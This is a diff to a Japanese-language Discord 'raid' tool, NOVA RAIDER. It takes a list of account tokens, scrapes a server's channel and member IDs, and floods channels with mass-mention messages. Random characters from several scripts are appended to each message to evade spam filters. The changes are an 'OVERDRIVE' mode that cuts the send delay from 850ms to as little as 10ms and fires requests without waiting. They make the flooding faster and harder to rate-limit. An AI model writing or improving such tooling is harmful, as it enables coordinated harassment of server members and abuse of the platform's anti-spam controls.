@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>NOVA RAIDER - Multi-Lang</title>
+    <title>NOVA RAIDER - Zero Delay</title>
     <style>
         :root {
             --bg: #040406;
@@ -50,6 +50,12 @@
         .mode-btn { flex: 1; padding: 10px; background: #111; color: #555; border: 1px solid #333; text-align: center; cursor: pointer; font-size: 12px; border-radius: 4px; }
         .mode-btn.active { border-color: var(--accent); color: var(--accent); background: rgba(0, 212, 255, 0.1); }
 
+        /* 超高速設定セクション */
+        .delay-control {
+            background: rgba(255, 0, 85, 0.1); padding: 15px; border-radius: 4px; border: 1px solid var(--danger); margin-bottom: 15px;
+            box-shadow: 0 0 15px rgba(255, 0, 85, 0.2);
+        }
+
         .status-bar {
             display: flex; justify-content: space-between; background: #000; padding: 12px;
             border-radius: 4px; margin-bottom: 15px; border: 1px solid var(--border); font-size: 13px;
@@ -63,7 +69,7 @@
 
 <div class="container">
     <div class="title-area">
-        <h1 class="title">NOVA RAIDER</h1>
+        <h1 class="title">NOVA RAIDER V10</h1>
     </div>
 
     <div class="form-section" style="margin-bottom: 15px;">
@@ -83,6 +89,20 @@
         </div>
     </div>
 
+    <div class="delay-control">
+        <label style="color: var(--danger); letter-spacing: 2px;">送信制限 (秒) - 最小 0.01</label>
+        <div style="display: flex; align-items: center; gap: 15px;">
+            <input type="range" id="delayRange" min="0" max="3" step="0.01" value="0.5" style="accent-color: var(--danger);" 
+                   oninput="document.getElementById('delayNum').value = this.value">
+            <div style="display: flex; align-items: center; gap: 5px;">
+                <input type="number" id="delayNum" value="0.5" step="0.01" min="0" style="width: 80px; text-align: center; color: var(--danger); font-weight: bold;" 
+                       oninput="document.getElementById('delayRange').value = this.value">
+                <span style="font-size: 12px; color: var(--danger);">秒</span>
+            </div>
+        </div>
+        <p style="font-size: 9px; color: #ff8888; margin-top: 5px; margin-bottom: 0;">※ 0秒（0.01秒）設定はトークンBANおよびレート制限のリスクが極めて高いです。</p>
+    </div>
+
     <div class="flex-row">
         <textarea class="flex-1" id="channels" style="height: 60px;" placeholder="チャンネルIDリスト"></textarea>
         <textarea class="flex-1" id="members" style="height: 60px;" placeholder="メンバーIDリスト"></textarea>
@@ -99,17 +119,17 @@
             <label>送信メッセージ (手動入力必須)</label>
             <input type="text" id="msgBody" placeholder="空欄では送信できません" value="">
         </div>
-        <div style="width: 180px;">
+        <div style="width: 160px;">
             <label>ランダム回避言語</label>
             <select id="lang">
-                <option value="en">英語 (Alpha)</option>
-                <option value="en_num">英数字 (Alphanumeric)</option>
-                <option value="jp_kana">日本語 (ひらがな/カタカナ)</option>
+                <option value="en">英語</option>
+                <option value="en_num">英数字</option>
+                <option value="jp_kana">日本語 (かな)</option>
                 <option value="jp_kanji">日本語 (漢字)</option>
-                <option value="ko">韓国語 (Korean)</option>
-                <option value="km">クメール語 (Khmer)</option>
-                <option value="ar">アラビア語 (Arabic)</option>
-                <option value="zh">中国語 (Chinese)</option>
+                <option value="ko">韓国語</option>
+                <option value="km" selected>クメール語</option>
+                <option value="ar">アラビア語</option>
+                <option value="zh">中国語</option>
             </select>
         </div>
     </div>
@@ -121,7 +141,7 @@
     </div>
 
     <div class="flex-row">
-        <button id="start" class="btn btn-main flex-1" onclick="execute()">RAID 起動</button>
+        <button id="start" class="btn btn-main flex-1" onclick="execute()">RAID OVERDRIVE 起動</button>
         <button id="stop" class="btn btn-stop" onclick="stop()" disabled>停止</button>
     </div>
 
@@ -136,12 +156,12 @@
     const charSets = {
         en: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
         en_num: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
-        jp_kana: "あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをんアイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン",
-        jp_kanji: "一二三四五六七八九十百千万電撃戦術爆撃殲滅壊滅地獄闇魔法神官竜王騎士修羅羅刹鬼神",
-        ko: "가나다라마바사아자차카타파하거너더러머버서어저처커터퍼허기니디리미비시이지치키티피히",
+        jp_kana: "あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん",
+        jp_kanji: "一二三四五六七八九十百千万電撃戦術爆撃殲滅壊滅地獄闇魔法",
+        ko: "가나다라마바사아자차카타파하",
         km: "កខគឃងចឆជឈញដឋឌឍណតថទធនបផពភមយរលវសហឡអ",
         ar: "ابتثجحخدذرزسشصضطظعغفقكلمنهوي",
-        zh: "天地玄黄宇宙洪荒日月盈昃辰宿列张寒来暑往秋收冬藏"
+        zh: "天地玄黄宇宙洪荒日月盈昃辰宿列张"
     };
 
     function log(m) {
@@ -156,13 +176,12 @@
         document.getElementById('modeNormal').classList.toggle('active', mode === 'normal');
         document.getElementById('modeReply').classList.toggle('active', mode === 'reply');
         document.getElementById('currentModeDisplay').innerText = mode.toUpperCase();
-        log(`モード切替: ${mode.toUpperCase()}`);
     }
 
     async function fetchData() {
         const t = document.getElementById('tokens').value.split('\n')[0].trim();
         const g = document.getElementById('guildId').value.trim();
-        if(!t || !g) return alert("トークンとサーバーIDが必要です");
+        if(!t || !g) return alert("同期には有効なトークン1枚とサーバーIDが必要です");
         try {
             const rC = await fetch(`https://discord.com/api/v9/guilds/${g}/channels`, { headers: { 'Authorization': t } });
             const data = await rC.json();
@@ -170,7 +189,7 @@
             const rM = await fetch(`https://discord.com/api/v9/guilds/${g}/members?limit=1000`, { headers: { 'Authorization': t } });
             const mData = await rM.json();
             document.getElementById('members').value = mData.map(m => m.user.id).join('\n');
-            log("同期成功。ターゲットをリストアップしました。");
+            log("同期成功。");
         } catch(e) { log("同期失敗。"); }
     }
 
@@ -188,14 +207,19 @@
         sweeping = true;
         document.getElementById('start').disabled = true;
         document.getElementById('stop').disabled = false;
-        document.getElementById('statusText').innerText = "RUNNING";
+        document.getElementById('statusText').innerText = "OVERDRIVE";
         
         const tokens = document.getElementById('tokens').value.split('\n').filter(x => x.trim());
         const channels = document.getElementById('channels').value.split('\n').filter(x => x.trim());
         const members = document.getElementById('members').value.split('\n').filter(x => x.trim());
         const limit = parseInt(document.getElementById('limit').value);
+        
+        // 0秒指定でも内部的には最小10ms(0.01s)を確保
+        let delaySec = parseFloat(document.getElementById('delayNum').value);
+        if (delaySec < 0.01) delaySec = 0.01;
+        const delayMs = delaySec * 1000;
 
-        log(`${attackMode.toUpperCase()} 爆撃開始...`);
+        log(`攻撃開始 (間隔: ${delaySec}s)`);
 
         for (const chId of channels) {
             if (!sweeping) break;
@@ -209,7 +233,7 @@
                         for (const m of msgs) {
                             if (!sweeping) break;
                             await sendMsg(tokens, chId, m.id, members, msg);
-                            await new Promise(r => setTimeout(r, 850));
+                            await new Promise(r => setTimeout(r, delayMs));
                         }
                     }
                 } catch (e) {}
@@ -217,7 +241,7 @@
                 for (let i = 0; i < limit; i++) {
                     if (!sweeping) break;
                     await sendMsg(tokens, chId, null, members, msg);
-                    await new Promise(r => setTimeout(r, 850));
+                    await new Promise(r => setTimeout(r, delayMs));
                 }
             }
         }
@@ -233,15 +257,16 @@
             payload.allowed_mentions = { replied_user: true };
         }
         try {
-            const res = await fetch(`https://discord.com/api/v9/channels/${chId}/messages`, {
+            fetch(`https://discord.com/api/v9/channels/${chId}/messages`, {
                 method: 'POST',
                 headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
+            }).then(res => {
+                if (res.ok) {
+                    sentCount++;
+                    document.getElementById('sentCount').innerText = sentCount;
+                }
             });
-            if (res.ok) {
-                sentCount++;
-                document.getElementById('sentCount').innerText = sentCount;
-            }
         } catch (e) {}
     }
 
